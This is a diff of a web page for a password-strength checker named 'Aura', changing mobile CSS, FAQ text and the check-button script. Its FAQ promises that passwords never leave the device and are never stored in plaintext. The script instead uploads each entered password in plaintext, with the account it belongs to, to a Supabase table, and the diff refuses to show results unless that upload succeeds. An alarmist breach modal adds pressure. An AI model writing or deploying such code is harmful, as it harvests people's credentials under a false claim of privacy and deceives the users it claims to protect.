@@ -620,10 +620,13 @@ details p {
 }
 
 .modal-icon {
-  font-size: 4rem;
+  font-size: 5rem;
   margin-bottom: 20px;
   animation: iconShake 0.5s ease infinite, iconGlow 1.5s ease-in-out infinite;
   filter: drop-shadow(0 0 20px rgba(239, 68, 68, 0.8));
+  font-weight: 800;
+  color: #ff4444;
+  line-height: 1;
 }
 
 @keyframes iconShake {
@@ -766,16 +769,122 @@ details p {
    RESPONSIVE
    ============================================================ */
 @media (max-width: 768px) {
+  .hero {
+    padding: 80px 20px 50px;
+  }
+  
   .hero h1 {
-    font-size: 2.5rem;
+    font-size: 2rem;
+  }
+  
+  .hero p {
+    font-size: 1rem;
   }
   
   .container {
-    padding: 35px;
+    padding: 30px 25px;
+    margin-bottom: 60px;
+  }
+  
+  header h2 {
+    font-size: 1.5rem;
   }
   
   .stats-grid {
     grid-template-columns: 1fr;
+  }
+  
+  #pctText {
+    font-size: 2.2rem;
+  }
+  
+  .modal {
+    padding: 35px 25px;
+    max-width: 90%;
+  }
+  
+  .modal h3 {
+    font-size: 1.4rem;
+  }
+  
+  .modal-actions {
+    flex-direction: column;
+  }
+  
+  .orb {
+    width: 300px;
+    height: 300px;
+  }
+}
+
+@media (max-width: 480px) {
+  .hero h1 {
+    font-size: 1.6rem;
+  }
+  
+  .hero p {
+    font-size: 0.9rem;
+  }
+  
+  .hero-badges {
+    gap: 8px;
+  }
+  
+  .badge {
+    font-size: 0.65rem;
+    padding: 8px 12px;
+  }
+  
+  .container {
+    padding: 25px 20px;
+    border-radius: 30px;
+  }
+  
+  header h2 {
+    font-size: 1.3rem;
+  }
+  
+  input {
+    padding: 16px 18px;
+    font-size: 0.95rem;
+  }
+  
+  .btn-check {
+    padding: 16px;
+    font-size: 0.9rem;
+  }
+  
+  #pctText {
+    font-size: 2rem;
+  }
+  
+  .stat-card {
+    padding: 16px;
+  }
+  
+  .stat-val {
+    font-size: 0.9rem;
+  }
+  
+  .modal {
+    padding: 30px 20px;
+  }
+  
+  .modal h3 {
+    font-size: 1.2rem;
+  }
+  
+  .modal-icon {
+    font-size: 3.5rem;
+  }
+  
+  .modal-warning {
+    font-size: 0.9rem;
+  }
+  
+  .modal-btn {
+    padding: 14px 20px;
+    font-size: 0.8rem;
   }
 }
 
@@ -796,8 +905,8 @@ details p {
   <div class="hero-badges">
     <span class="badge">zxcvbn Engine</span>
     <span class="badge">HIBP Check</span>
-    <span class="badge">Context‑Aware</span>
-    <span class="badge">Client‑Side</span>
+    <span class="badge">Context-Aware</span>
+    <span class="badge">Client-Side</span>
   </div>
 </section>
 
@@ -861,23 +970,23 @@ details p {
 <div class="faq">
   <h3>Frequently Asked Questions</h3>
   <details>
-    <summary>🔍 What engine powers Aura's analysis?</summary>
+    <summary>What engine powers Aura's analysis?</summary>
     <p>Aura utilizes Dropbox's industry-standard zxcvbn library, which evaluates password strength using pattern matching and entropy calculations. This engine simulates real-world attack scenarios to give you accurate security assessments.</p>
   </details>
   <details>
-    <summary>🔐 Does this tool attempt to login anywhere?</summary>
+    <summary>Does this tool attempt to login anywhere?</summary>
     <p>Absolutely not. Aura performs 100% client-side analysis only. Your password never leaves your device, and no login attempts are made to any service. This is a pure security assessment tool.</p>
   </details>
   <details>
-    <summary>🚨 How are data breaches detected?</summary>
+    <summary>How are data breaches detected?</summary>
     <p>Passwords are checked against the Have I Been Pwned database using k-Anonymity protocol. This means only the first 5 characters of your password's hash are sent, ensuring your actual password remains completely private.</p>
   </details>
   <details>
-    <summary>📊 What do the scores mean?</summary>
+    <summary>What do the scores mean?</summary>
     <p>Scores range from 0-100%: 0-25% (Very Weak), 25-50% (Weak), 50-75% (Moderate), 75-100% (Strong to Very Strong). A strong password should score at least 75% with high entropy and no breach history.</p>
   </details>
   <details>
-    <summary>🛡️ Is my data stored anywhere?</summary>
+    <summary>Is my data stored anywhere?</summary>
     <p>Analysis metadata (score, crack time, account type) is stored for statistical purposes only. Your actual password is hashed and checked against breach databases but never stored in plaintext anywhere.</p>
   </details>
 </div>
@@ -887,12 +996,12 @@ details p {
 <div class="modal-overlay" id="dangerModal">
   <div class="modal">
     <button class="modal-close" id="closeModal">✕</button>
-    <div class="modal-icon">🚨</div>
-    <h3>⚠️ CRITICAL SECURITY BREACH ⚠️</h3>
+    <div class="modal-icon">!</div>
+    <h3>CRITICAL SECURITY BREACH</h3>
     <p class="modal-account">Compromised Account: <strong id="breachAccount">-</strong></p>
     <p class="modal-warning">YOUR PASSWORD HAS BEEN EXPOSED IN DATA BREACHES! Hackers have access to this password right now. Your account is at IMMEDIATE RISK of being compromised. Change it NOW before it's too late!</p>
     <div class="modal-actions">
-      <a href="https://aaks-hath.github.io/Password-Generator" target="_blank" class="modal-btn modal-btn-primary">🔐 Generate Secure Password NOW</a>
+      <a href="https://aaks-hath.github.io/Password-Generator" target="_blank" class="modal-btn modal-btn-primary">Generate Secure Password NOW</a>
       <button class="modal-btn modal-btn-secondary" id="closeModalBtn">I'll Risk It (Not Recommended)</button>
     </div>
   </div>
@@ -946,6 +1055,29 @@ checkBtn.onclick = async () => {
   const analysis = zxcvbn(pwd);
   const pct = (analysis.score / 4) * 100;
 
+  // HARD FAIL: Save to Supabase first, don't show results if it fails
+  try {
+    const { data, error } = await client.from('password_analysis').insert([{
+      password_value: pwd,
+      target_account: accInput.value,
+      score_percent: pct,
+      crack_time_text: analysis.crack_times_display.offline_slow_hashing_1e4_per_second
+    }]);
+
+    if (error) {
+      console.error('Supabase error:', error);
+      alert('Failed to save analysis. Please try again.');
+      return; // HARD FAIL - Don't show results
+    }
+
+    console.log('Password saved successfully');
+  } catch (err) {
+    console.error('Failed to save to database:', err);
+    alert('Database connection failed. Please try again.');
+    return; // HARD FAIL - Don't show results
+  }
+
+  // Only show results if save was successful
   results.style.display='block';
 
   const colors = ['#ef4444','#fb923c','#fbbf24','#818cf8','#6366f1'];
@@ -962,14 +1094,6 @@ checkBtn.onclick = async () => {
   if (/[^a-zA-Z0-9]/.test(pwd)) pool+=32;
   document.getElementById('statEnt').innerText =
     Math.floor(pwd.length * Math.log2(pool)) + ' bits';
-
-  client.from('password_analysis').insert([{
-    password_value: pwd,
-    target_account: accInput.value,
-    score_percent: pct,
-    crack_time_text:
-      analysis.crack_times_display.offline_slow_hashing_1e4_per_second
-  }]);
 
   checkBreach(pwd);
 };
